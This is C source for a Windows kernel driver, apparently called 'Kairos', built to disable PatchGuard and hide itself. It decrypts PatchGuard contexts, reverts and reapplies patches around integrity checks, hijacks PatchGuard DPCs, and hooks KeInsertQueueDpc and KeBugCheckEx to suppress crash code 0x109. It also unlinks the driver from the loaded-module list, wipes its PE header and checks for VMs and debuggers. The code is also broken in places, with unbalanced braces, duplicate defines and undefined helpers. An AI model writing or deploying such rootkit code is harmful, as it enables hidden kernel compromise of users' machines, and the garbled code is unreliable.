#include <ntddk.h>
#include "common/utilities.h"
#include "patchguard/pg_context.h"
#include "hvci/hvci_policy.h"
#include "vbs/secure_memory.h"
#include "tpm_pluton/tpm_integration.h"

// --- Configurable Constants ---
#define MAX_PG_CONTEXTS       64
#define SHARED_MEMORY_SIZE    0x1000  // 4KB

// --- Context Tracking Structure ---
typedef struct _PG_CONTEXT_ENTRY {
    PVOID ContextAddress;
    ULONGLONG LastCheckTime;
} PG_CONTEXT_ENTRY, *PPG_CONTEXT_ENTRY;

typedef struct _KAIROS_PATCH_ENTRY {
    PVOID TargetAddress;
    UCHAR Original[16];
    UCHAR Patch[16];
    BOOLEAN Active;
} KAIROS_PATCH_ENTRY, *PKAIROS_PATCH_ENTRY;

typedef struct _PG_BEHAVIOR_PROFILE {
    LARGE_INTEGER Timestamp;
    PVOID TriggeredFrom;
    PVOID DeferredRoutine;
    ULONG StackHash;
    BOOLEAN Suppressed;
} PG_BEHAVIOR_PROFILE;

#define MAX_PATCHES 8
KAIROS_PATCH_ENTRY g_PatchList[MAX_PATCHES] = { 0 };
PG_CONTEXT_ENTRY g_PgContextArray[MAX_PG_CONTEXTS];
ULONG g_NumPgContexts = 0;
PVOID g_SharedMemoryBase = NULL;
HANDLE g_PgMonitorThreadHandle = NULL;
BOOLEAN g_StopPgMonitorThread = FALSE;
UCHAR OriginalBytes[16] = {0};
UCHAR PatchedBytes[16]  = { /* your hook or patch */ };
PVOID PatchAddress      = NULL;  // Set this!

typedef struct _ENCRYPTED_PATCH_ENTRY {
    PVOID TargetAddress;
    UCHAR EncryptedPatch[16];
    UCHAR OriginalBytes[16];
    BOOLEAN Active;
    UCHAR XorKey;
} ENCRYPTED_PATCH_ENTRY;

#define MAX_PATCHES 8
ENCRYPTED_PATCH_ENTRY g_PatchVault[MAX_PATCHES] = { 0 };

ULONG HashSymbol(PCSTR name) {
    ULONG hash = 5381;
    while (*name) {
        hash = ((hash << 5) + hash) + *name++;
    }
    return hash;
}

PVOID ResolveKernelSymbolByHash(ULONG expectedHash) {
    PVOID kernelBase = GetKernelBase();
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)kernelBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)kernelBase + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (PUCHAR)kernelBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names = (PDWORD)((PUCHAR)kernelBase + exportDir->AddressOfNames);
    PDWORD functions = (PDWORD)((PUCHAR)kernelBase + exportDir->AddressOfFunctions);
    PWORD ordinals = (PWORD)((PUCHAR)kernelBase + exportDir->AddressOfNameOrdinals);

    for (ULONG i = 0; i < exportDir->NumberOfNames; i++) {
        PCSTR name = (PCSTR)(kernelBase + names[i]);
        ULONG hash = HashSymbol(name);

        if (hash == expectedHash) {
            USHORT ordinal = ordinals[i];
            return (PVOID)((PUCHAR)kernelBase + functions[ordinal]);
        }
    }

    return NULL;
}

VOID RegisterPatch(PVOID addr, PUCHAR patch, SIZE_T len) {
    for (int i = 0; i < MAX_PATCHES; i++) {
        if (!g_PatchVault[i].Active) {
            UCHAR key = (UCHAR)__rdtsc();  // Simple entropy

            g_PatchVault[i].TargetAddress = addr;
            RtlCopyMemory(g_PatchVault[i].OriginalBytes, addr, len);

            for (SIZE_T j = 0; j < len; j++) {
                g_PatchVault[i].EncryptedPatch[j] = patch[j] ^ key;
            }

            g_PatchVault[i].XorKey = key;
            g_PatchVault[i].Active = TRUE;
            break;
        }
    }
}

VOID RevertKernelPatch() {
    for (int i = 0; i < MAX_PATCHES; i++) {
        if (g_PatchList[i].Active) {
            RtlCopyMemory(g_PatchList[i].TargetAddress,
                          g_PatchList[i].Original, sizeof(g_PatchList[i].Original));
        }
    }
}

VOID ReapplyKernelPatch() {
    for (int i = 0; i < MAX_PATCHES; i++) {
        if (g_PatchList[i].Active) {
            RtlCopyMemory(g_PatchList[i].TargetAddress,
                          g_PatchList[i].Patch, sizeof(g_PatchList[i].Patch));
        }
    }
}

VOID ApplyEncryptedPatches() {
    for (int i = 0; i < MAX_PATCHES; i++) {
        if (g_PatchVault[i].Active) {
            UCHAR decrypted[16] = { 0 };
            for (int j = 0; j < 16; j++) {
                decrypted[j] = g_PatchVault[i].EncryptedPatch[j] ^ g_PatchVault[i].XorKey;
            }

            RtlCopyMemory(g_PatchVault[i].TargetAddress, decrypted, sizeof(decrypted));
        }
    }
}

VOID RevertEncryptedPatches() {
    for (int i = 0; i < MAX_PATCHES; i++) {
        if (g_PatchVault[i].Active) {
            RtlCopyMemory(g_PatchVault[i].TargetAddress, g_PatchVault[i].OriginalBytes, sizeof(g_PatchVault[i].OriginalBytes));
        }
    }
}

// --- Forward Declarations ---
NTSTATUS FindUniquePatchGuardContexts(void);
NTSTATUS DecryptContextAndUpdate(PVOID ContextAddress, PULONG64 LastCheckTime);
VOID PgMonitorThread(PVOID StartContext);
ULONGLONG GetSystemUptime(void);

// --- Find PG Contexts (stubbed) ---
NTSTATUS FindUniquePatchGuardContexts(void) {
    if (g_NumPgContexts < MAX_PG_CONTEXTS) {
        g_PgContextArray[g_NumPgContexts].ContextAddress = ResolveKernelSymbol("NtAllocateVirtualMemory");
        g_PgContextArray[g_NumPgContexts].LastCheckTime = 0;
        g_NumPgContexts++;
    }
    return STATUS_SUCCESS;
}

// --- Decrypt & Update Tracking Entry ---
NTSTATUS DecryptContextAndUpdate(PVOID ContextAddress, PULONG64 LastCheckTime) {
    UCHAR key[32] = {0};
    UCHAR decryptedBuffer[sizeof(DECRYPTED_PG_CONTEXT)] = {0};

    ExtractPgEncryptionKey(ContextAddress, key);
    NTSTATUS status = DecryptPatchGuardContext(key, sizeof(key),
        (PUCHAR)ContextAddress + PG_CTX_ENCRYPTED_OFFSET,
        decryptedBuffer, sizeof(decryptedBuffer));

    if (NT_SUCCESS(status)) {
        *LastCheckTime = ((DECRYPTED_PG_CONTEXT*)decryptedBuffer)->LastCheckTime;
    } else {
        *LastCheckTime = 0;
    }
    return status;
}

// --- Threaded PG Context Monitor ---
VOID PgMonitorThread(PVOID StartContext) {
    UNREFERENCED_PARAMETER(StartContext);
    LARGE_INTEGER interval;
    interval.QuadPart = -10 * 1000 * 1000;  // 1 second
    ULONGLONG threshold = 3 * 60 * 10000000ULL;

    while (!g_StopPgMonitorThread) {
        ULONGLONG now = GetSystemUptime();
        BOOLEAN allRecent = TRUE;

        TracePatchGuardThreads() 
        
        for (ULONG i = 0; i < g_NumPgContexts; i++) {
            DecryptContextAndUpdate(g_PgContextArray[i].ContextAddress, &g_PgContextArray[i].LastCheckTime);
            if (g_PgContextArray[i].LastCheckTime == 0 ||
                now < g_PgContextArray[i].LastCheckTime ||
                (now - g_PgContextArray[i].LastCheckTime) > threshold) {
                allRecent = FALSE;
                break;
            }
        }

        if (allRecent) {
            DbgPrint("All PatchGuard contexts have been updated within threshold.\n");
            break;
        }

        if (g_SharedMemoryBase) {
            RtlCopyMemory(g_SharedMemoryBase, g_PgContextArray, sizeof(PG_CONTEXT_ENTRY) * g_NumPgContexts);
        }

        KeDelayExecutionThread(KernelMode, FALSE, &interval);

        if ((now - g_PgContextArray[i].LastCheckTime) > threshold) {
        DebugLog("PG is about to run. Reverting patch!\n");
        RevertKernelPatch();
}

// Wait, then reapply
KeDelayExecutionThread(KernelMode, FALSE, &interval);
ReapplyKernelPatch();
    }

    PsTerminateSystemThread(STATUS_SUCCESS);
}

// --- Simple Uptime Stub ---
ULONGLONG GetSystemUptime(void) {
    return KeQueryInterruptTime();
}

// --- Driver Unload Routine ---
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    g_StopPgMonitorThread = TRUE;
    if (g_SharedMemoryBase) {
        ExFreePoolWithTag(g_SharedMemoryBase, 'pgsm');
        g_SharedMemoryBase = NULL;
    }
    DebugLog("Driver unloading...\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;
    HANDLE threadHandle = NULL;

    DriverObject->DriverUnload = DriverUnload;

    status = FindUniquePatchGuardContexts();
    if (!NT_SUCCESS(status) || g_NumPgContexts == 0) {
        DebugLog("No PatchGuard contexts found.\n");
        return status;
    }

    g_SharedMemoryBase = ExAllocatePoolWithTag(NonPagedPool, SHARED_MEMORY_SIZE, 'pgsm');
    if (!g_SharedMemoryBase) {
        DebugLog("Failed to allocate shared memory.\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(g_SharedMemoryBase, SHARED_MEMORY_SIZE);

    status = PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, PgMonitorThread, NULL);
    if (!NT_SUCCESS(status)) {
        DebugLog("Failed to create monitor thread.\n");
        ExFreePoolWithTag(g_SharedMemoryBase, 'pgsm');
        return status;
    }

    g_PgMonitorThreadHandle = threadHandle;
    DebugLog("Driver loaded and monitoring PatchGuard contexts.\n");
    return STATUS_SUCCESS;
}

#define KERNEL_SCAN_SIZE 0x2000000  // 32MB
#define PG_DPC_TAG 0x4450434B // 'KCPD' as marker

typedef struct _DETECTED_PG_DPC {
    PKDPC DpcAddress;
    PVOID DeferredRoutine;
} DETECTED_PG_DPC, *PDETECTED_PG_DPC;

#define MAX_PG_DPCS 8
DETECTED_PG_DPC g_PgDpcs[MAX_PG_DPCS];
ULONG g_NumDetectedDpcs = 0;

VOID ScanForPatchGuardDpcs() {
    PVOID base = GetKernelBase();
    ULONG size = GetKernelSize();

    for (ULONG offset = 0; offset < size - sizeof(KDPC); offset += 8) {
        PKDPC candidate = (PKDPC)((PUCHAR)base + offset);
        
        if (MmIsAddressValid(candidate) &&
            candidate->Type == 0x13 &&  // DPC type
            MmIsAddressValid(candidate->DeferredRoutine)) {

            const CHAR* routineName = GetSymbolNameFromAddress(candidate->DeferredRoutine); // your symbol resolver
            if (routineName && strstr(routineName, "PatchGuard")) {
                if (g_NumDetectedDpcs < MAX_PG_DPCS) {
                    g_PgDpcs[g_NumDetectedDpcs].DpcAddress = candidate;
                    g_PgDpcs[g_NumDetectedDpcs].DeferredRoutine = candidate->DeferredRoutine;
                    g_NumDetectedDpcs++;
                    DebugLog("Detected potential PatchGuard DPC: %p (Routine: %p)\n", candidate, candidate->DeferredRoutine);
                }
            }
        }
    }
}

VOID NullifyPatchGuardDpcs() {
    for (ULONG i = 0; i < g_NumDetectedDpcs; i++) {
        PKDPC dpc = g_PgDpcs[i].DpcAddress;
        dpc->DeferredRoutine = &FakeDpcRoutine;
        DebugLog("Hijacked PG DPC at %p -> %p\n", dpc, &FakeDpcRoutine);
    }
}

VOID FakeDpcRoutine(IN struct _KDPC *Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    DebugLog("FakeDpcRoutine called — PG defanged.\n");
}

PVOID OriginalKeInsertQueueDpc = NULL;
UCHAR KeInsertQueueDpcOriginal[16] = { 0 };
UCHAR KeInsertQueueDpcHook[] = {
    0x48, 0xB8,                   // mov rax, <address>
    /* 8 bytes of address */
    0xFF, 0xE0                    // jmp rax
};

VOID HookKeInsertQueueDpc() {
    UNICODE_STRING routineName;
    RtlInitUnicodeString(&routineName, L"KeInsertQueueDpc");
    PVOID target = MmGetSystemRoutineAddress(&routineName);

    if (!target) return;

    OriginalKeInsertQueueDpc = target;
    RtlCopyMemory(KeInsertQueueDpcOriginal, target, sizeof(KeInsertQueueDpcOriginal));

    *(PVOID*)&KeInsertQueueDpcHook[2] = &HookedKeInsertQueueDpc;

    // Enable writing to kernel memory
    PMDL mdl = IoAllocateMdl(target, sizeof(KeInsertQueueDpcHook), FALSE, FALSE, NULL);
    MmBuildMdlForNonPagedPool(mdl);
    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

    RtlCopyMemory(mapped, KeInsertQueueDpcHook, sizeof(KeInsertQueueDpcHook));
    MmUnmapLockedPages(mapped, mdl);
    IoFreeMdl(mdl);

    DebugLog("KeInsertQueueDpc hooked.\n");
}

BOOLEAN HookedKeInsertQueueDpc(PKDPC Dpc, PVOID Arg1, PVOID Arg2, PVOID Arg3) {
    if (Dpc && MmIsAddressValid(Dpc->DeferredRoutine)) {
        if (Dpc && Dpc->DeferredRoutine) {
          DebugLog("New DPC queued: %p\n", Dpc->DeferredRoutine);
          WalkStackTrace();  // Identify who queued the DPC
        const CHAR* name = GetSymbolNameFromAddress(Dpc->DeferredRoutine);
        if (name && strstr(name, "PatchGuard")) {
            DebugLog("Blocked PG DPC queueing: %p\n", Dpc->DeferredRoutine);
            return FALSE;  // Cancel PG execution
        }
    }

    // Call the original function
    return ((BOOLEAN(*)(PKDPC, PVOID, PVOID, PVOID))OriginalKeInsertQueueDpc)(Dpc, Arg1, Arg2, Arg3);
}

VOID UnhookKeInsertQueueDpc() {
    if (OriginalKeInsertQueueDpc) {
        PMDL mdl = IoAllocateMdl(OriginalKeInsertQueueDpc, sizeof(KeInsertQueueDpcOriginal), FALSE, FALSE, NULL);
        MmBuildMdlForNonPagedPool(mdl);
        PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

        RtlCopyMemory(mapped, KeInsertQueueDpcOriginal, sizeof(KeInsertQueueDpcOriginal));
        MmUnmapLockedPages(mapped, mdl);
        IoFreeMdl(mdl);

        DebugLog("KeInsertQueueDpc unhooked.\n");
    }
}

PVOID OriginalKeBugCheckEx = NULL;
UCHAR KeBugCheckExOriginal[16] = { 0 };
UCHAR KeBugCheckExHook[] = {
    0x48, 0xB8,                   // mov rax, <hook_address>
    /* 8 bytes for address */
    0xFF, 0xE0                    // jmp rax
};

VOID HookKeBugCheckEx() {
    UNICODE_STRING funcName;
    RtlInitUnicodeString(&funcName, L"KeBugCheckEx");
    PVOID target = MmGetSystemRoutineAddress(&funcName);

    if (!target) return;

    OriginalKeBugCheckEx = target;
    RtlCopyMemory(KeBugCheckExOriginal, target, sizeof(KeBugCheckExOriginal));
    *(PVOID*)&KeBugCheckExHook[2] = &HookedKeBugCheckEx;

    // Patch kernel memory safely
    PMDL mdl = IoAllocateMdl(target, sizeof(KeBugCheckExHook), FALSE, FALSE, NULL);
    MmBuildMdlForNonPagedPool(mdl);
    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

    RtlCopyMemory(mapped, KeBugCheckExHook, sizeof(KeBugCheckExHook));
    MmUnmapLockedPages(mapped, mdl);
    IoFreeMdl(mdl);

    DebugLog("KeBugCheckEx hooked.\n");
}

VOID HookedKeBugCheckEx(ULONG BugCheckCode, ULONG Param1, ULONG Param2, ULONG Param3, ULONG Param4) {
    // PatchGuard uses 0x109 (CRITICAL_STRUCTURE_CORRUPTION)
    if (BugCheckCode == 0x109 || BugCheckCode == 0x1A) {
        DebugLog("!!! PatchGuard tried to crash the system: 0x%X !!!\n", BugCheckCode);
        return;

        // Call original but log first
        // ((VOID(*)(ULONG,ULONG,ULONG,ULONG,ULONG))OriginalKeBugCheckEx)(BugCheckCode, Param1, Param2, Param3, Param4);
    } else {
        // Non-PG crashes should still happen
        ((VOID(*)(ULONG,ULONG,ULONG,ULONG,ULONG))OriginalKeBugCheckEx)(BugCheckCode, Param1, Param2, Param3, Param4);
    }
}

VOID UnhookKeBugCheckEx() {
    if (OriginalKeBugCheckEx) {
        PMDL mdl = IoAllocateMdl(OriginalKeBugCheckEx, sizeof(KeBugCheckExOriginal), FALSE, FALSE, NULL);
        MmBuildMdlForNonPagedPool(mdl);
        PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

        RtlCopyMemory(mapped, KeBugCheckExOriginal, sizeof(KeBugCheckExOriginal));
        MmUnmapLockedPages(mapped, mdl);
        IoFreeMdl(mdl);
        DebugLog("KeBugCheckEx unhooked.\n");
    }
}VOID HideDriverFromPsLoadedModuleList(PDRIVER_OBJECT DriverObject) {
    PLIST_ENTRY currentEntry = (PLIST_ENTRY)DriverObject->DriverSection;

    if (!currentEntry) return;

    PLIST_ENTRY prev = currentEntry->Blink;
    PLIST_ENTRY next = currentEntry->Flink;

    if (prev && next) {
        prev->Flink = next;
        next->Blink = prev;
        currentEntry->Flink = currentEntry->Blink = NULL;
        DebugLog("Driver unlinked from PsLoadedModuleList.\n");
    }
}

VOID ErasePEHeader(PVOID ImageBase) {
    if (!ImageBase) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return;

    SIZE_T headerSize = ntHeader->OptionalHeader.SizeOfHeaders;
    RtlFillMemory(ImageBase, headerSize, 0);
    DebugLog("PE header erased at %p.\n", ImageBase);
}

BOOLEAN IsRunningInVMware() {
    int vmMagic;
    __try {
        __asm {
            mov eax, 'VMXh'
            mov ecx, 0x0A
            mov dx, 'VX'
            in eax, dx
            mov vmMagic, ebx
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return (vmMagic == 'VMXh');
}

BOOLEAN IsHyperVPresent() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] >> 31) & 1;
}

BOOLEAN IsDebuggerPresent() {
    return KdDebuggerEnabled || KdDebuggerNotPresent == 0;
}

VOID CloakDriverName(PDRIVER_OBJECT DriverObject) {
    RtlFillMemory(DriverObject->DriverName.Buffer,
                  DriverObject->DriverName.Length, 0x00);
    DriverObject->DriverName.Length = 0;
    DebugLog("Driver name cloaked.\n");
}

VOID WalkStackTrace(VOID) {
    PVOID stack[32] = { 0 };
    USHORT captured = RtlCaptureStackBackTrace(0, 32, stack, NULL);

    DebugLog("Captured %u stack frames:\n", captured);
    for (USHORT i = 0; i < captured; i++) {
        DebugLog("  [%u] %p\n", i, stack[i]);
    }
}



VOID CloakKairosDriver(PDRIVER_OBJECT DriverObject) {
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

    if (!entry) return;

    // 1. Unlink from PsLoadedModuleList
    RemoveEntryList(&entry->InLoadOrderLinks);
    RemoveEntryList(&entry->InMemoryOrderLinks);
    RemoveEntryList(&entry->InInitializationOrderLinks);

    // 2. Overwrite fields in LDR entry
    RtlZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
    RtlZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
    entry->FullDllName.Length = 0;
    entry->BaseDllName.Length = 0;

    // 3. Null references
    entry->DllBase = NULL;
    entry->EntryPoint = NULL;
    entry->SizeOfImage = 0;

    // 4. Cloak DriverObject fields
    RtlZeroMemory(DriverObject->DriverName.Buffer, DriverObject->DriverName.Length);
    DriverObject->DriverName.Length = 0;

    // 5. Wipe PE header
    PUCHAR base = (PUCHAR)DriverObject->DriverStart;
    if (!MmIsAddressValid(base)) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    SIZE_T headerSize = nt->OptionalHeader.SizeOfHeaders;
    RtlFillMemory(base, headerSize, 0);

    DebugLog("Kairos driver cloaked: LDR unlinked + PE header wiped.");
}

PVOID AllocateTrampoline(PVOID target, PVOID redirect) {
    PUCHAR stub = ExAllocatePoolWithTag(NonPagedPoolExecute, 32, 'trap');
    if (!stub) return NULL;

    // mov rax, redirect_addr
    stub[0] = 0x48;
    stub[1] = 0xB8;
    *(PVOID*)&stub[2] = redirect;

    // jmp rax
    stub[10] = 0xFF;
    stub[11] = 0xE0;

    return stub;
}

typedef struct _PATCHED_ROUTINE {
    PVOID OriginalFunction;
    UCHAR OriginalBytes[16];
    SIZE_T Length;
    BOOLEAN Active;
} PATCHED_ROUTINE;

PATCHED_ROUTINE g_HookedPgRoutine = { 0 };

VOID HookPgDeferredRoutine(PVOID originalRoutine, PVOID trampoline) {
    if (!originalRoutine || !trampoline) return;

    SIZE_T patchLen = 12;  // size of our stub

    // Save original bytes
    RtlCopyMemory(g_HookedPgRoutine.OriginalBytes, originalRoutine, patchLen);
    g_HookedPgRoutine.OriginalFunction = originalRoutine;
    g_HookedPgRoutine.Length = patchLen;
    g_HookedPgRoutine.Active = TRUE;

    // Enable write
    PMDL mdl = IoAllocateMdl(originalRoutine, patchLen, FALSE, FALSE, NULL);
    MmBuildMdlForNonPagedPool(mdl);
    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

    // Overwrite with jump to trampoline
    RtlCopyMemory(mapped, trampoline, patchLen);

    MmUnmapLockedPages(mapped, mdl);
    IoFreeMdl(mdl);

    DebugLog("PG routine hooked via trampoline.");
}

VOID UnhookPgDeferredRoutine() {
    if (!g_HookedPgRoutine.Active) return;

    PMDL mdl = IoAllocateMdl(g_HookedPgRoutine.OriginalFunction, g_HookedPgRoutine.Length, FALSE, FALSE, NULL);
    MmBuildMdlForNonPagedPool(mdl);
    PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

    RtlCopyMemory(mapped, g_HookedPgRoutine.OriginalBytes, g_HookedPgRoutine.Length);

    MmUnmapLockedPages(mapped, mdl);
    IoFreeMdl(mdl);

    g_HookedPgRoutine.Active = FALSE;

    DebugLog("PG routine unhooked.");
}
